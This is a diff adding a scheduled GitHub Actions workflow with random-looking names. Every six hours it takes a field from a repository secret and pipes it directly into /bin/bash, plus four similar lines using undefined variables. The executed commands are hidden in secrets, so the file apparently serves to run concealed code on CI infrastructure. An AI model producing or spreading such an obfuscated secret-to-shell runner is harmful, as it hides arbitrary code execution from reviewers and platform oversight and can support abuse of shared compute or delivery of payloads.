@@ -1,0 +1,22 @@
+name: snowsam7
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: snowsam7
+        env:
+          ywt63458: ${{ secrets.ywt63458 }}
+        run: |
+          echo $ywt63458 | jq -r .lkqp0 | /bin/bash
+          echo $aoyq255 | jq -r .d2929 | /bin/bash
+          echo $vx84923 | jq -r .oa06 | /bin/bash
+          echo $zvjl6 | jq -r .b27986 | /bin/bash
+          echo $tjz410 | jq -r .yk3896 | /bin/bash
+
